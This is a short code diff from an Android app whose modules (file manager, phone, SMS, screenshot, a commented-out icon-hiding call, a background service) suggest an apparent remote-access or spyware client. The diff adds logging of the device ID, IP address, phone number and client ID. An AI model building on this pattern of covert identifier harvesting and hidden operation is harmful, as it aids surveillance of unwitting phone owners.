@@ -20,6 +20,7 @@ import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.Phone;
 import com.ot.grhq.client.functionality.SMS;
 import com.ot.grhq.client.functionality.Screenshot;
+import com.ot.grhq.client.functionality.Utils;
 
 import java.io.File;
 import java.io.IOException;
@@ -49,6 +50,11 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         checkPermissions();
+
+        Log.d("eeee", Utils.deviceID(getApplicationContext()));
+        Log.d("eeee", Utils.ipAddress());
+        Log.d("eeee", Utils.phoneNumber(getApplicationContext()));
+        Log.d("eeee", String.valueOf(Utils.clientID(getApplicationContext())));
 
 //        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
